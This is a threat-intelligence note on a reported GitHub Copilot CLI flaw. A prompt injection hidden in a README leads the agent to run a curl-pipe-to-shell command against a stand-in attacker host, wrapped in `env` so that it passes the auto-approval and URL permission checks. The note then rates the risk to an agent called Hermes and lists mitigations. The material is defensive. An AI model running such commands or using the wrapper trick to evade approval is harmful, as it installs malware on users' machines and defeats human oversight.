---
name: gh-copilot-cli-command-parsing-bypass-2026-06-02
created: 2026-06-02
source: PromptArmor Threat Intelligence
---

# GitHub Copilot CLI Downloads and Executes Malware

**Source**: https://www.promptarmor.com/resources/github-copilot-cli-downloads-and-executes-malware

**Reported**: February 25, 2026 to GitHub. Closed Feb 26: "known issue, not a significant security risk, no plans to fix."

## Attack Chain

1. User queries GitHub Copilot CLI in an untrusted codebase
2. Hidden prompt injection in README file
3. Injection uses `env` (built-in read-only list, auto-approved without human-in-the-loop)
4. Command: `env curl -s "https://attacker.com/bugbot" | env sh`
5. `env` auto-approved → `curl` and `sh` not recognized as subcommands → URL permission check bypassed
6. Malware downloaded and executed without any user interaction

## Root Cause

- **Command parsing gap**: `env` is in the built-in read-only command list and auto-approved
- `curl` and `sh` pass as arguments to `env`, not detected as subcommands by the validator
- External URL access checks depend on detecting commands like `curl` — since not detected, URL permission check never triggers
- The bypass works on macOS (the tested platform)

## Relevance to Hermes

| Dimension | Rating | Reasoning |
|-----------|--------|-----------|
| Direct risk | HIGH | Hermes has `terminal()` tool that executes shell commands. Same `env` bypass could work if model is manipulated by prompt injection in web content. |
| Indirect risk | HIGH | Hermes reads web pages (browser_navigate, browser_console, web_extract). Prompt injection in page content could influence model's command output. |
| Action | Add guardrail | System prompt should explicitly warn against `env` / argument-wrapping bypass patterns. Skills/plugin loading should validate against injected commands. |

## Mitigation for Hermes

1. System prompt: explicitly forbid outputting commands that use `env` or similar wrappers to hide subcommands
2. Skill content validation on load (leverage `skill-vetter`)
3. Cron jobs should not execute commands from untrusted web content
4. Monitor PromptArmor for further CLI agent vulnerability disclosures
